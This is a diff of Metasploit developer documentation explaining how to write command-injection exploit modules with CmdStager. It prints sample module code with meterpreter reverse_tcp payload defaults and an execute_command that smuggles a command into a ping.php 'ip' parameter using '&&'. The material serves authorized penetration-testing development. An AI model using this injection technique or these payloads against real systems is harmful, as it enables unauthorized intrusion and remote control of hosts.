@@ -101,41 +101,46 @@ However, it is best to set the compatible list of flavors in `CmdStagerFlavor`, 
 You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is how you define how to execute a command on the target.  The parameter `cmd` is the command to execute.  When writing the ```execute_cmd``` method, remember that
 
 **4. Decide on the supported payloads**
-This is a bit new.  CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are `ARCH_CMD` payloads that rely on software already present on the target system like netcat, bash, python, or ssh.  Depending on whether the payload needs to be saved to disk or not changes what payloads are supported and how we launch the payload, so we must provide the user the ability to pick between the two.
-The best way to let the user decide what kind of payload to use is by defining separate [targets](https://docs.metasploit.com/docs/development/developing-modules/guides/get-started-writing-an-exploit.html#:~:text=Targets%20%2D%20The%20Targets,the%20target%20method.)
+
+CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are `ARCH_CMD` payloads that rely on software already present on the target system like netcat, bash, python, or ssh.  Depending on whether the payload needs to be saved to disk or not changes what payloads are supported and how we launch the payload, so we must provide the user the ability to pick between the two.
+The best way to let the user decide what kind of payload to use is by defining separate [[targets|Get-Started-Writing-an-Exploit.md]]
+
 Here is an example targets section from a command injection module:
-```
-        'Targets' => [
-          [
-            'Unix Command',
-            {
-              'Platform' => 'unix',
-              'Arch' => ARCH_CMD,
-              'Type' => :unix_cmd,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',
-                'RPORT' => 9000
-              }
-            }
-          ],
-          [
-            'Linux (Dropper)',
-            {
-              'Platform' => 'linux',
-              'Arch' => [ARCH_X64],
-              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
-              'Type' => :linux_dropper
-            }
-          ],
 
 ```
+    'Targets' => [
+      [
+        'Unix Command',
+        {
+          'Platform' => 'unix',
+          'Arch' => ARCH_CMD,
+          'Type' => :unix_cmd,
+          'DefaultOptions' => {
+            'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp',
+            'RPORT' => 9000
+          }
+        }
+      ],
+      [
+        'Linux (Dropper)',
+        {
+          'Platform' => 'linux',
+          'Arch' => [ARCH_X64],
+          'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' },
+          'Type' => :linux_dropper
+        }
+      ],
+
+```
+
 The first target is the `ARCH_CMD` target and `unix` platform.  This allows the user to select any payload that starts with `cmd/unix`.  These payloads do not need to be saved to disk and can just be launched at the command line.  The second is `ARCH_X64` and the platform is `linux`; this lets us choose any payload that starts with `linux/x64`.  These targets must be saved to disk before they can be launched, and as such, you will often see this second type of payload referred to as a ‘dropper’ because the file must be ‘dropped’ to the disk before it can be executed.  In each of the targets above, we’ve selected a default payload we know will work.
 
 **4. Executing a payload**
 As we said earlier, the way a payload is executed depends on the payload type.  By including `Msf::Exploit::CmdStager` you are given access to a method called ```execute_cmdstager```.  ```execute_cmdstager``` makes a list of required commands to upload, save, and execute your payload, then uses the ```execute_command``` method you defined earlier to run them on the target.
 Unfortunately, we just mentioned not all payloads need to be saved to disk.  In the case of a payload that does not need to be saved to disk, we only need to call ```execute_command```.
 This problem of payload/method juggling sounds far worse than it is.  Below is a quick example of how simple the ```exploit``` method will become if you have properly defined your targets as discussed in step 3:
-```
+
+```ruby
   def exploit
     print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
     case target['Type']
@@ -144,7 +149,9 @@ This problem of payload/method juggling sounds far worse than it is.  Below is a
     when :linux_dropper
       execute_cmdstager
     end
+  end
 ```
+
 That’s it.  If the user selects an `ARCH_CMD` payload, we call the ```execute_command``` method on the _already_ _encoded_ payload.  You don’t need to worry about encoding the payload in your ```execute_command``` method.
 If the user has selected a binary payload like `ARCH_X64` or `ARCH_X86`, then we call ```execute_cmdstager``` which figures out how to save the file to disk and launch it based on the flavor you set earlier.
 
@@ -165,22 +172,26 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::CmdStager
 
-  def initialize(info={})
-    super(update_info(info,
-                      'Name'            => "Command Injection Using CmdStager",
-                      'Description'     => %q{
-        This exploits a command injection using the command stager.
-      },
-                      'License'         => MSF_LICENSE,
-                      'Author'          => [ 'sinn3r' ],
-                      'References'      => [ [ 'URL', 'http://metasploit.com' ] ],
-                      'Platform'        => 'linux',
-                      'Targets'         => [ [ 'Linux', {} ] ],
-                      'Payload'         => { 'BadChars' => "\x00" },
-                      'CmdStagerFlavor' => [ 'printf' ],
-                      'Privileged'      => false,
-                      'DisclosureDate'  => "2016-06-10",
-                      'DefaultTarget'   => 0))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Command Injection Using CmdStager',
+        'Description' => %q{
+          This exploits a command injection using the command stager.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r' ],
+        'References' => [ [ 'URL', 'http://metasploit.com' ] ],
+        'Platform' => 'linux',
+        'Targets' => [ [ 'Linux', {} ] ],
+        'Payload' => { 'BadChars' => "\x00" },
+        'CmdStagerFlavor' => [ 'printf' ],
+        'Privileged' => false,
+        'DisclosureDate' => '2016-06-10',
+        'DefaultTarget' => 0
+      )
+    )
   end
 
   def execute_command(cmd, opts = {})
@@ -188,7 +199,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def exploit
-    print_status("Exploiting...")
+    print_status('Exploiting...')
     execute_cmdstager
   end
 
@@ -213,19 +224,21 @@ def filter_bad_chars(cmd)
   cmd.gsub!(/ /, '+')
 end
 
-def execute_command(cmd, opts = {})
-  send_request_cgi({
-                     'method'        => 'GET',
-                     'uri'           => '/ping.php',
-                     'encode_params' => false,
-                     'vars_get'      => {
-                       'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
-                     }
-                   })
+def execute_command(cmd, _opts = {})
+  send_request_cgi(
+    {
+      'method' => 'GET',
+      'uri' => '/ping.php',
+      'encode_params' => false,
+      'vars_get' => {
+        'ip' => "127.0.0.1+%26%26+#{filter_bad_chars(cmd)}"
+      }
+    }
+  )
 end
 
 def exploit
-  print_status("Exploiting...")
+  print_status('Exploiting...')
   execute_cmdstager
 end
 ```
@@ -538,5 +551,3 @@ Or set the :fetch key to `execute_cmdstager`:
 ```ruby
 execute_cmdstager(flavor: :fetch)
 ```
-
-
